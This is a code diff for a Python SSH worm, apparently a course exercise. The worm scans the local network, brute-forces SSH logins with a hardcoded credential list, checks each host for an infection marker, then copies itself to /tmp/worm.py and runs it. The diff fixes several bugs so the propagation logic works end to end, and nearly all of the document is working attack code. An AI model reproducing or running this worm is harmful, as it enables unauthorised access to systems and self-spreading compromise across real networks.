@@ -1,11 +1,9 @@
-from asyncio.windows_events import NULL
 from genericpath import exists
 import paramiko
 import sys
 import socket
 import nmap
 import netifaces
-import os
 
 # The list of credentials to attempt
 credList = [
@@ -32,7 +30,10 @@ def isInfectedSystem():
 # Marks the system as infected
 #################################################################
 def markInfected():
-	open(INFECTED_MARKER_FILE, 'x')
+	try:
+		open(INFECTED_MARKER_FILE, 'x')
+	except:
+		pass
 
 ###############################################################
 # Spread to the other system and execute
@@ -47,8 +48,7 @@ def spreadAndExecute(sshClient):
 	sftpClient = sshClient.open_sftp()
 	sftpClient.put('/tmp/worm.py','/tmp/worm.py')
 	sshClient.exec_command('chmod 777 /tmp/worm.py')
-	sshClient.exec_command("nohup python3 /tmp/worm.py")
-	pass
+	sshClient.exec_command("python3 /tmp/worm.py")
 
 
 ############################################################
@@ -86,7 +86,7 @@ def attackSystem(host):
 
 	# Set some parameters to make things easier.
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-	ssh.open_sftp().get()
+
 	# The results of an attempt
 	attemptResults = None
 				
@@ -97,7 +97,7 @@ def attackSystem(host):
 			return victim
 			
 	# Could not find working credentials
-	return NULL	
+	return None	
 
 ####################################################
 # Returns the IP of the current system
@@ -105,7 +105,7 @@ def attackSystem(host):
 # like to know
 # @return - The IP address of the current system
 ####################################################
-def getMyIP(interface):
+def getMyIP():
 	networkInterfaces = netifaces.interfaces()
 	ipAddr = None
 
@@ -162,20 +162,19 @@ def getHostsOnTheSameNetwork():
 # is to hardcode the origin system's IP address and have
 # the worm check the IP of the current system against the hardcoded IP. 
 if len(sys.argv) < 2: 
-	if(isInfectedSystem):
+	if(isInfectedSystem()):
 		print("infected")
 		sys.exit()
 markInfected()
 
-# +TODO: Get the IP of the current system
+# Gets the IP of the current system
 myIP = getMyIP()
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
 
-# +TODO: Remove the IP of the current system
-# from the list of discovered systems (we
-# do not want to target ourselves!).
+# Remove the current IP from
+# the list of discovered systems.
 networkHosts.remove(myIP)
 print("Found hosts: ", networkHosts)
 
@@ -186,21 +185,20 @@ for host in networkHosts:
 	sshInfo = attackSystem(host)
 	print(sshInfo)
 	
-	# Did the attack succeed?
+	# Continues if there was a successfull ssh connection
 	if sshInfo:
 		print("Trying to spread")
 		
-		# -TODO: Check if the system was	
-		# already infected.(which the worm will place there
-		# when it first infects the system)
+		# Check if the system was	
+		# already infected.
 		#
 		# If the system was already infected proceed.
 		# Otherwise, infect the system and terminate.
 		# Infect that system
 
 		try:
-			remotepath = '/tmp/infected.txt'
-			localpath  = '/tmp/infected.txt'
+			remotepath = INFECTED_MARKER_FILE
+			localpath  = INFECTED_MARKER_FILE
 			 # Copy the file from the specified
 			 # remote path to the specified
 		 	 # local path. If the file does exist
@@ -209,12 +207,11 @@ for host in networkHosts:
 		 	 # (that is, we know the system is
 		 	 # not yet infected).
 		 
-			sshInfo[0].open_sftp().get(remotepath, localpath)
-			spreadAndExecute(sshInfo[0])
+			sshInfo[0].open_sftp().get(remotepath, localpath)	
+			print("already infected")		
 		except IOError:
-			print("This system should already be infected")
-
+			print("This system will be infected")
+			spreadAndExecute(sshInfo[0])
 		
-		
-		print("Spreading complete")
+	print("Spreading complete")
 	
